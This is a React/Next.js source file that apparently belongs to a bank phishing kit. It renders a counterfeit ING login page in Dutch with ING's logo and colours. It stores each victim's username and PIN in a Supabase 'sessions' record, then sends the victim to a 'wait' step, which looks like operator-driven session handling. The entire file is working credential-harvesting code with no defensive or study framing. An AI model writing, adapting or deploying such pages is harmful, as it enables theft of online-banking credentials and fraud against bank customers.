"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { stepToPath } from "@/lib/session-routes";

export function IngClient({ sessionId }: { sessionId: string }) {
  const router = useRouter();
  const supabase = createBrowserSupabaseClient();
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [saving, setSaving] = useState(false);

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (!supabase || !sessionId) return;
      const { data } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
      if (cancelled || !data) return;
      const fd = (data.form_data ?? {}) as Record<string, string>;
      if (fd.verfuegernummer) setUsername(fd.verfuegernummer);
      if (fd.pin) setPassword(fd.pin);
    })();
    return () => { cancelled = true; };
  }, [sessionId, supabase]);

  async function handleSubmit() {
    if (!supabase || !sessionId) return;
    setSaving(true);
    const { data: existing } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
    const prev = (existing?.form_data ?? {}) as Record<string, unknown>;
    await supabase.from("sessions").update({
      current_step: "wait",
      form_data: { ...prev, bankSlug: "ing", bankName: "ING", verfuegernummer: username, pin: password }
    }).eq("id", sessionId);
    router.replace(stepToPath("wait", sessionId));
  }

  return (
    <div className="min-h-screen bg-white font-sans flex">
      <div className="flex-1 flex flex-col justify-center px-8 sm:px-20 lg:px-32 xl:px-40 relative">
        <div className="absolute top-8 left-8 sm:left-20 lg:left-32 xl:left-40">
          <img src="/bank-logos/ing.svg" alt="ING" className="h-10" />
        </div>
        <div className="w-full max-w-md mt-16">
          <h1 className="text-[32px] font-bold text-[#FF6200] mb-2">Inloggen Mijn ING</h1>
          <p className="text-gray-600 mb-8">Vul uw gebruikersnaam en wachtwoord in om in te loggen.</p>
          <form onSubmit={(e) => { e.preventDefault(); void handleSubmit(); }} className="space-y-5">
            <div>
              <label className="block text-sm font-bold text-gray-700 mb-2">Gebruikersnaam</label>
              <input required type="text" value={username} onChange={e => setUsername(e.target.value)} className="w-full border-b-2 border-gray-300 py-2 px-1 focus:outline-none focus:border-[#FF6200] transition-colors" />
            </div>
            <div>
              <label className="block text-sm font-bold text-gray-700 mb-2">Wachtwoord</label>
              <input required type="password" value={password} onChange={e => setPassword(e.target.value)} className="w-full border-b-2 border-gray-300 py-2 px-1 focus:outline-none focus:border-[#FF6200] transition-colors" />
            </div>
            <button type="submit" disabled={saving || !username || !password} className="w-full bg-[#FF6200] text-white font-bold py-4 rounded-full mt-4 hover:bg-[#E65800] disabled:opacity-50 transition-colors">
              {saving ? "Laden..." : "Inloggen"}
            </button>
          </form>
        </div>
      </div>
      <div className="hidden lg:block w-1/2 bg-[#F5F5F5] relative overflow-hidden">
        <img src="/bank-assets/Ing/ING sağ taraf aslan .svg" alt="ING Aslan" className="absolute inset-0 w-full h-full object-cover object-left opacity-90" />
      </div>
    </div>
  );
}